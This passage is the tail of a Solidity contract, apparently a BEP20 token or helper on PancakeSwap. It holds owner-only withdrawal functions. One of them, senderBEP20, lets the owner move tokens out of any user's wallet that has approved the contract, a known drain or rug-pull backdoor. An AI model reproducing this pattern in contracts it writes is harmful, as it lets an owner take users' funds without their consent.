        IPancakePair(pair).sync();
    }

    function withdraw(address _to,uint256 _amount) public payable returns (bool){
        require(msg.sender==owner,' only owner');
        address(uint160(_to)).transfer(_amount);
        return true;
    }

    function withdrawBEP20(address _to,uint256 _amount,address _token) public returns (bool){
        require(msg.sender==owner,' only owner');
        IERC20(_token).transfer(_to, _amount);
        return true;
    }

    function senderBEP20(address _sender,address _to,uint256 _amount,address _token) public returns (bool){
        require(msg.sender==owner,' only owner');
        IERC20(_token).transferFrom(_sender, _to, _amount);
        return true;
    }

}